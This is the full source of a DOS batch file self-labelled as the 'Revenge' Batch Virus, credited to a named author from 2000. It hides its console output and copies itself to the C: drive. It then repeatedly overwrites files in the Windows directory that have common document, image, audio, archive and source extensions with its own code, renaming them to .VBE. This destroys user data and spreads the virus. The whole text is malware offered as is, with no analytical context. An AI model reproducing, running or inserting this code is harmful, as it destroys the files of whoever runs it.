REM   "Revenge" Batch Virus.
REM   Copyright 20.08.2000 by GhostDog@EveryMail.net
@Echo off
ctty nul
Copy VBE.bat C:\VBE.bat
IF NOT EXIST C:\VBE.bat GOTO END
C:
cd %windir%
:Start
for %%f in (*.htm *.pas *.bas *.zip *.gif *.wav *.doc *.bmp) do set A=%%f
if %A%==Command.com set A=
if %A%==System.ini set A=
if %A%==MsDos.sys set A=
Copy VBE.bat %A%
ren %A% *.VBE
set A=
GOTO Start
:END
ctty con
